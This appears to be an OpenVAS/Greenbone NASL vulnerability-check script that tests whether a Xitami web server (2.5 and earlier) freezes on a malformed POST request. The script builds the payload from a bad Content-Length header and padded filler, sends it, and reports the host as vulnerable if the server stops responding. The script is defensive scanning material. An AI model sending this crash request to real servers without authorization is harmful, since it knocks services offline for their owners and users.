if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11934" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 9083 );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_name( "Xitami malformed header DoS" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2003 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "secpod_xitami_server_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "xitami/http/detected" );
	script_tag( name: "solution", value: "Upgrade your software or use another." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "It is possible to freeze the remote web server by
  sending a malformed POST request." );
	script_tag( name: "affected", value: "This is know to affect Xitami 2.5 and earlier versions." );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
req = NASLString( "POST /forum/index.php HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Accept-Encoding: None\\r\\n", "Content-Length: 10\\n\\n", crap( 512 ), "\\r\\n", crap( 512 ) );
send( socket: soc, data: req );
http_recv( socket: soc );
http_close_socket( soc );
if(http_is_dead( port: port )){
	security_message( port: port );
}

